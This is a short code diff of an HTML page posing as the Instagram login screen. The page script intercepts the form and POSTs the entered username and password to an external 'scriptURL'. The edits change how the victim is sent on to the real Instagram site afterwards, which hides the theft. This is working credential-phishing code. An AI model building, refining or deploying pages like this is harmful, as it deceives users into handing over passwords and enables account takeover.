@@ -22,7 +22,7 @@
                     <label for="password" class="sr-only">Password</label>
                     <input name="password" type="password" placeholder="Password" />
 
-                    <button type="submit">Log In</button>
+                    <a href="https://www.instagram.com/accounts/login/"><button type="submit">Log In</button></a>
                 </form>
                 <div class="flex separator align-items-center">
                     <span></span>
@@ -76,9 +76,10 @@
         form.addEventListener('submit', e => {
           e.preventDefault()
           fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-            .then(response => window.location("https://www.instagram.com/accounts/login/"))
             .catch(error => console.error('Error!', error.message))
             })
+
+        
       </script>
   
 </body> 
